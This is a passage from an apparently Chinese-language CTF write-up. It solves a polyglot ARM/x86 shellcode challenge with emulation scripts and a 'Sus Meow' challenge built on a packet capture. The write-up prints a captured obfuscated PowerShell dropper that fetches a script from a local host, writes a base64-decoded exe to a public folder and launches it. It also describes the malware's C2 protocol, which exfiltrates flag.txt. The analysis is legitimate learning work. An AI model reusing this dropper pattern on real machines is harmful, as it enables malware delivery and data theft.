class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h5><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++"># include &lt;stdio.h&gt;# include  &lt;stdint.h&gt;unsigned char rsp[] &#x3D;&#123;  0xAF, 0xBC, 0xF0, 0x6B, 0x04, 0x82, 0x05, 0xA4, 0x56, 0xB6,   0x16, 0x48, 0xC0, 0x93, 0xAE, 0x51, 0x78, 0x8F, 0xB5, 0xB8,   0x4E, 0x31, 0xB5, 0xED, 0x9F, 0xA5, 0xB3, 0xA0, 0xC6, 0xD8,   0x95, 0x00, 0x7F, 0xDD, 0x5A, 0xF3, 0x3E, 0xCF, 0x49, 0x7D,   0xF0, 0xCC, 0xC3, 0x65, 0x16, 0xD6, 0xEA, 0x8C, 0x3C, 0x52,   0xDD, 0xD8, 0xC0, 0xC9, 0x82, 0xCB, 0x4B, 0xFD, 0xD4, 0x84,   0xE8, 0x8B, 0x01, 0x00, 0x00, 0x66, 0x0F, 0x6F, 0x05, 0x14,   0x02, 0x00, 0x00, 0x49, 0x89, 0xD2, 0x31, 0xC9, 0x45, 0x31,   0xC0, 0x0F, 0x11, 0x47, 0x02, 0x66, 0x0F, 0x6F, 0x05, 0x10,   0x02, 0x00, 0x00, 0x0F, 0x11, 0x47, 0x12, 0x66, 0x0F, 0x6F,   0x05, 0x14, 0x02, 0x00, 0x00, 0x0F, 0x11, 0x47, 0x22, 0x66,   0x0F, 0x6F, 0x05, 0x18, 0x02, 0x00, 0x00, 0x0F, 0x11, 0x47,   0x32, 0x66, 0x0F, 0x6F, 0x05&#125;;int main()&#123;int rcx &#x3D; 0;uint8_t* rdi &#x3D; (uint8_t*)(rsp);uint8_t* rsi &#x3D; (uint8_t*)(rsp + 0x1C);do&#123;rdi[rcx] &#x3D; rdi[rcx] ^ rsi[rcx];rcx &#x3D; rcx + 1;&#125;while(rcx!&#x3D;0x1c);write(1,rsp,0x1c);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h4><p>丢到 IDA 各种架构一顿测试，发现为 <code>ARM64</code> 和 <code>x86-64</code>, 简单分析后发现基本逻辑都是解密后使用系统调用 print 出来直接使用 unicorn 模拟执行。</p><p>ARM64部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> capstone <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> unicorn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> unicorn<span class="token punctuation">.</span>arm64_const <span class="token keyword">import</span> <span class="token operator">*</span>cs <span class="token operator">=</span> Cs<span class="token punctuation">(</span>CS_ARCH_ARM64<span class="token punctuation">,</span> UC_MODE_ARM<span class="token punctuation">)</span>polyglot <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./polyglot'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> polyglot<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>polyglot<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>ADDRESS <span class="token operator">=</span> <span class="token number">0</span>STACK <span class="token operator">=</span> <span class="token number">0x100000</span><span class="token keyword">def</span> <span class="token function">hook_code</span><span class="token punctuation">(</span>uc<span class="token punctuation">:</span> Uc<span class="token punctuation">,</span> address<span class="token punctuation">,</span> size<span class="token punctuation">,</span> user_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> cs<span class="token punctuation">.</span>disasm<span class="token punctuation">(</span>uc<span class="token punctuation">.</span>mem_read<span class="token punctuation">(</span>address<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0x%x:\t%s\t%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>address<span class="token punctuation">,</span> i<span class="token punctuation">.</span>mnemonic<span class="token punctuation">,</span> i<span class="token punctuation">.</span>op_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'svc'</span><span class="token punctuation">:</span>            call <span class="token operator">=</span> uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_ARM64_REG_X8<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>> syscall num: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>call<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> call <span class="token operator">==</span> <span class="token number">64</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>uc<span class="token punctuation">.</span>mem_read<span class="token punctuation">(</span>uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_ARM64_REG_X1<span class="token punctuation">)</span><span class="token punctuation">,</span> uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_ARM64_REG_X2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>uc <span class="token operator">=</span> Uc<span class="token punctuation">(</span>UC_ARCH_ARM64<span class="token punctuation">,</span> UC_MODE_ARM<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_map<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> <span class="token number">0x100000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_map<span class="token punctuation">(</span>STACK<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_write<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> code<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>reg_write<span class="token punctuation">(</span>UC_ARM64_REG_SP<span class="token punctuation">,</span> STACK <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>hook_add<span class="token punctuation">(</span>UC_HOOK_CODE<span class="token punctuation">,</span> hook_code<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>emu_start<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> ADDRESS <span class="token operator">+</span> <span class="token number">0x44</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x86-64部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> capstone <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> unicorn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> unicorn<span class="token punctuation">.</span>x86_const <span class="token keyword">import</span> <span class="token operator">*</span>cs <span class="token operator">=</span> Cs<span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">)</span>polyglot <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./polyglot'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> polyglot<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>polyglot<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>ADDRESS <span class="token operator">=</span> <span class="token number">0</span>STACK <span class="token operator">=</span> <span class="token number">0x100000</span><span class="token keyword">def</span> <span class="token function">hook_code</span><span class="token punctuation">(</span>uc<span class="token punctuation">:</span> Uc<span class="token punctuation">,</span> address<span class="token punctuation">,</span> size<span class="token punctuation">,</span> user_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># print(">>> Tracing instruction at 0x%x, instruction size = 0x%x" % (address, size))</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> cs<span class="token punctuation">.</span>disasm<span class="token punctuation">(</span>uc<span class="token punctuation">.</span>mem_read<span class="token punctuation">(</span>address<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"0x%x:\t%s\t%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span>address<span class="token punctuation">,</span> i<span class="token punctuation">.</span>mnemonic<span class="token punctuation">,</span> i<span class="token punctuation">.</span>op_str<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>mnemonic <span class="token operator">==</span> <span class="token string">'syscall'</span><span class="token punctuation">:</span>            call <span class="token operator">=</span> uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_X86_REG_RAX<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>> syscall num: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>call<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">if</span> call <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f">>> arg1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_X86_REG_RDI<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">, arg2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>uc<span class="token punctuation">.</span>mem_read<span class="token punctuation">(</span>uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_X86_REG_RSI<span class="token punctuation">)</span><span class="token punctuation">,</span> uc<span class="token punctuation">.</span>reg_read<span class="token punctuation">(</span>UC_X86_REG_RDX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>uc <span class="token operator">=</span> Uc<span class="token punctuation">(</span>UC_ARCH_X86<span class="token punctuation">,</span> UC_MODE_64<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_map<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> <span class="token number">0x100000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_map<span class="token punctuation">(</span>STACK<span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>mem_write<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> code<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>reg_write<span class="token punctuation">(</span>UC_X86_REG_RSP<span class="token punctuation">,</span> STACK <span class="token operator">+</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>uc<span class="token punctuation">.</span>hook_add<span class="token punctuation">(</span>UC_HOOK_CODE<span class="token punctuation">,</span> hook_code<span class="token punctuation">)</span>uc<span class="token punctuation">.</span>emu_start<span class="token punctuation">(</span>ADDRESS<span class="token punctuation">,</span> ADDRESS <span class="token operator">+</span> <span class="token number">0x2a7</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Sus-Meow"><a href="#Sus-Meow" class="headerlink" title="Sus Meow"></a><strong>Sus Meow</strong></h2><p>第二个题目，是一段网络通信数据包的二进制文件。用wireshark分析还报错。所以也只能看十六进制显示的内容了。</p><p>然后我就猜着，会不会是这个解压出来的二进制文件，仍然是一个压缩包呢？  于是把<code>sus-meow </code> 更名为<code>sus-meow.zip</code>。然后解压缩一下，还真的解压出来了。一个<code>attachments</code>的文件夹里面包含了<code>challenge.pcapng</code>的文件。</p><p><strong>这里，我又去查了一下，发现zip压缩、rar压缩，出来的二进制文件。都不是以<code>attachements/</code>开头的。但是为啥这种方法就奏效了？，难道本身就是文件目录转换为的二进制？</strong></p><p>现在可以用wireshark分析<code>challenge.pcapng</code>了。追踪流之后，感觉像是用PowerShell 给服务器发指令+加密的恶意代码，然后让服务器解密+运行恶意代码。解密可以明显的看到用的是<code>FromBase64String</code></p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;muahaha.ps1 HTTP&#x2F;1.1User-Agent: Mozilla&#x2F;5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell&#x2F;5.1.19041.1682Host: 10.0.2.15Connection: Keep-AliveHTTP&#x2F;1.0 200 OKServer: SimpleHTTP&#x2F;0.6 Python&#x2F;3.10.8Date: Wed, 11 Jan 2023 11:02:35 GMTContent-type: application&#x2F;octet-streamContent-Length: 108368Last-Modified: Wed, 11 Jan 2023 10:55:29 GMT$cph8&#x3D;(&quot;&#123;4&#125;&#123;8&#125;&#123;1&#125;&#123;6&#125;&#123;3&#125;&#123;7&#125;&#123;0&#125;&#123;5&#125;&#123;2&#125;&#123;11&#125;&#123;9&#125;&#123;10&#125;&quot; -f&#39;3URi0QkHDmEJJgAAAAPhLMCAACNjCSUAAAAi0UAMdKNdQSJDCSJ0Yn1id6Jwrh4AAAA6K3h&#x2F;&#x2F;&#x2F;pEfr&#x2F;&#x2F;4uUJJgAAACDyiCJlCSYAAAA9sIED4Ve&#x2F;f&#x2F;&#x2F;3UUAjXUI2cDZ5Zvf4GYlAEVmPQABD4SzAgAA23wkQNtsJEAPt3wkSGaF&#x2F;3kKgMqAiZQkmAAAANnlm9&#x2F;g3dhmJQBFZj0ABQ+EfAMAANt8JDCLRCQwi1QkNGaB5&#x2F;9&#x2F;D4RMAwAAZoH&#x2F;ADwPjxwCAAAPv++5ATwAACnpMe0PrdDT6vbBIA9Fwg9F1QH5jbkEwP&#x2F;··········$lUOIoOXye4ZWRJ79vwRvpERQ &#x3D; (&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;)$xP6FknJVZBb &#x3D; [Convert]::FromBase64String($cph8)[IO.File]::WriteAllBytes($lUOIoOXye4ZWRJ79vwRvpERQ, $xP6FknJVZBb)&amp; ([string]::join(&#39;&#39;, ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%&#123; ( [char][int] $_)&#125;)) | % &#123;$_&#125;) (&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后面还有一些关于<code>powershell的命令</code>，我大胆的在自己的powershell下面执行了一下<code>&#39;&#123;2&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&#123;4&#125;&#123;1&#125;&#39; -f &#39;s\Pub&#39;,&#39;xe&#39;,&#39;C:\Us&#39;,&#39;er&#39;,&#39;lenge.e&#39;,&#39;lic\chal&#39;</code>–前面的数字其实是后面字符串的位置–拼起来就是<code>C:\Users\Public\challenge.exe</code>。这个exe负责存储base64解密之后的数据。</p><p>最后一行的指令<code>[string]::join(&#39;&#39;, ( (83,116,97,114,116,45,80,114,111,99,101,115,115) |%&#123; ( [char][int] $_)&#125;)) | % &#123;$_&#125;</code>—  先把十进制数转换为char类型，然后用转换后的字符串开启进程，执行exe恶意程序。<strong>具体Poweshell命令的细节，就不写了</strong>  </p><ul><li>83,116,97,114,116,45,80,114,111,99,101,115,115  -对应的字符串– <code>Start-Process</code></li></ul><p>然后，我就基本上在powershell中执行了一下所有的命令，就是没执行<del>哈哈哈。 说实在的，这种还是危险的，这里是图懒省事。！</del></p><p>这样的话，就把恶意程序给找到了<code>challenge.exe</code>。</p><p>之后就是反编译了，目前还没什么线索。</p><ul><li><p>在运行时，才会把调用真正的代码。反编译出来的，有一部分会收到<code>call  location+2</code> 这种 跳转指令的影响.</p><p>比如 <code>loc_11DE947</code>，ida在反编译的时候，会把 D9 90也理解为汇编指令，但实际上，这两个字节的数据是一个混淆的作用。</p><pre class="line-numbers language-none"><code class="language-none">.text:011DE939 C6 84 05 E7 DF FF FF 00       mov     byte ptr [ebp+eax-2019h], 0.text:011DE941 74 04                         jz      short loc_11DE947.text:011DE941.text:011DE943 75 02                         jnz     short loc_11DE947.text:011DE943.text:011DE943                               ; ---------------------------------------------------------------------------.text:011DE945 D9                            db 0D9h.text:011DE946 90                            db  90h.text:011DE947                               ; ---------------------------------------------------------------------------.text:011DE947.text:011DE947                               loc_11DE947:                            ; CODE XREF: .text:011DE941↑j.text:011DE947                                                                       ; .text:011DE943↑j.text:011DE947 74 04                         jz      short loc_11DE94D.text:011DE947.text:011DE949 75 02                         jnz     short loc_11DE94D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><blockquote><p>CRT：C Run-Time Libraries，平时我们使用Visual Studio编译的程序，都会链接CRT运行库，不然，我们的程序是无法运行的，它主要做一些程序运行前的初始化工作。例如全局变量，就是CRT库帮助我们在进入main之前提前初始化的，当然它做的不只这一点工作。</p></blockquote><h3 id="其他做法-1"><a href="#其他做法-1" class="headerlink" title="其他做法"></a>其他做法</h3><p>附件可以分离出一个流量包，分析流量包可以发现远程服务器先丢了个powershell脚本，脚本会创建一个exe并执行。exe有花指令je+jne，直接patch掉：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>start_ea <span class="token operator">=</span> <span class="token number">0x400000</span>end_ea <span class="token operator">=</span> <span class="token number">0x40EFA0</span><span class="token keyword">for</span> ea <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>start_ea<span class="token punctuation">,</span>end_ea<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> get_bytes<span class="token punctuation">(</span>ea<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">b'\x74\x04\x75\x02\xd9'</span><span class="token punctuation">:</span>        patch_bytes<span class="token punctuation">(</span>ea<span class="token punctuation">,</span><span class="token string">b'\x90\x90\x90\x90\x90'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序一开始先在402B80手动加载dll和获取dll函数地址并保存，直接下个断点就能拿到所有要用到的动态库函数。接着在401E20以http方式连接10.0.2.15:8080并接收数据。从流量包里拿到数据后base64解码得到一个json：</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;token&quot;: &quot;ae02977a8737de6b040b8ad4551a0213b8b20674241eb8dd84c14e74cf337772&quot;, &quot;key&quot;: &quot;O9jfIvI9BIHK0rXOpXOm9eY+&#x2F;VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg&#x3D;&#x3D;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来对json进行解析，获取字段数据。之后通过随机数生成AES的key和iv，拼在一起，并将其打包成一个json：</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;private&quot;: &quot;15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57&quot;, &quot;port&quot;: 12345&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>随后利用前面的key对json进行rc4加密，前面附上token，base64编码后通过12345端口以http方式发送给服务器。后面的流程就是服务器不断发送加密之后的指令，然后程序接收之后AES-CBC解密并根据command和arg执行命令，大概就是服务器查看当前目录，然后打开flag.txt并随机生成4字节密钥进行rc4加密，最后将其上传。所以在流量包找到最后程序上传到服务器的数据解密就得到flag：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ARC4<span class="token punctuation">,</span> AES<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token comment">#rc4_key = b64decode('O9jfIvI9BIHK0rXOpXOm9eY+/VamMhLM8VOEhrQiGKZi6vTXiTj72ZLPzmOOAeU+azt4EjR3jdsrSe9QiwY2Sg==')</span><span class="token comment">#rc4_cryptor = ARC4.new(rc4_key)</span><span class="token comment">#wired_json = rc4_cryptor.decrypt(b64decode('YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3MvqKYi9C4ShnMCAW+ROz+r5VvDidfJYCtNDoPg0XB8qkRkSpx9XPIP7ktZfpn35KHJeUkFFUd5Bn+iGqHge2v+9sjDiPsugqKaDwdFTeD1yFvDmxhhHSfl0gucow/RI=')[64:])</span><span class="token comment">#print(wired_json)</span>AES_key <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span><span class="token string">'15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57'</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span>AES_iv <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span><span class="token string">'15B627BBD8CAEE73125679E4C465253F08C9770576F6C47C734CF5A07A2E7A57'</span><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#AES_cryptor = AES.new(AES_key, AES.MODE_CBC, AES_iv)</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('YWUwMjk3N2E4NzM3ZGU2YjA0MGI4YWQ0NTUxYTAyMTNiOGIyMDY3NDI0MWViOGRkODRjMTRlNzRjZjMzNzc3Mkx1xPsoSCKHaQSUHhFAEtmQw6V3Bxw3Y2XdsbG3/CVE')[64:]))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=')))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('tJ023I7QC4uPgU/w2aIUAc4sz/EdGbg1xQCEUVb2qD2S+f7ZCsmQ+Q91PeWv0JRf')))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('jZOOa5bplXDXTEKBj873UI3kbp1z/IJcL9uxBCoQIdk=')))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('6ZnYHjOSTfzczMCaWwQkX699J7l1Dp7o0sV6EdujGH8=')))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('lF7EVQ5ZlA5m6fpvlaArIkjBK135u5ggbMqLiMbdcdweHYMUwgo4ss7XTBqpUQi3')))</span><span class="token comment">#print(AES_cryptor.decrypt(b64decode('7ufqZaQC+47ju2bBJ8sGURP2GVqO+H3W1DM7WgwTxFIy4uO8Slw5Vhw0DQLT4P7+')))</span>enc <span class="token operator">=</span> b64decode<span class="token punctuation">(</span><span class="token string">'+6pZVSFOV2hyrZuwZB7X/OIgUFVXzcjRsd0hpVM+Hs0NjT2SgrL+G/yHBujpw5Ax'</span><span class="token punctuation">)</span>AES_cryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>AES_key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> AES_iv<span class="token punctuation">)</span>enc <span class="token operator">=</span> AES_cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>table <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span><span class="token punctuation">)</span><span class="token keyword">for</span> a <span class="token keyword">in</span> table<span class="token punctuation">:</span>    <span class="token keyword">for</span> b <span class="token keyword">in</span> table<span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> table<span class="token punctuation">:</span>            <span class="token keyword">for</span> d <span class="token keyword">in</span> table<span class="token punctuation">:</span>                key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">]</span><span class="token punctuation">)</span>                rc4_cryptor <span class="token operator">=</span> ARC4<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>                m <span class="token operator">=</span> rc4_cryptor<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">b'idek&#123;'</span> <span class="token keyword">in</span> m<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4的原理非常简单，给定一个不超过256字节的密钥，根据密钥在算法中用伪随机数算法初始化一个长度为256、元素不重复的字节数组，之后逐字节读入待加密的数据，通过算法在S盒中取出一个字节并与明文字节进行位异或运算加密。</p><p><a href="https://zh.wikipedia.org/wiki/RC4">https://zh.wikipedia.org/wiki/RC4</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><code>Shift + E</code>可以把数据导出，选择合适的格式。根本没办法一个一个复制。</li><li>简单的汇编代码逻辑，我基本可以读懂了。但是稍微一复杂，就捉襟见肘了。虽然可以采用复制ida反汇编之后的函数，但是这种方式不利用长久的发展。—-后续还得加强吧。我估计看汇编也能看出来，就是比较耗时。</li><li>原来真的有人会把不同架构下的shellcode结合到一起，真的是厉害，x86下的代码会在arm架构下被当作数据处理。这道题是我第一次接触ARM架构下的反汇编。</li><li><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20230115203948.png" alt="系统调用汇编格式"></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://stackoverflow.com/questions/21552153/is-it-possible-to-compile-a-binary-which-will-run-on-both-x86-and-arm">https://stackoverflow.com/questions/21552153/is-it-possible-to-compile-a-binary-which-will-run-on-both-x86-and-arm</a></li><li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit</a></li><li><a 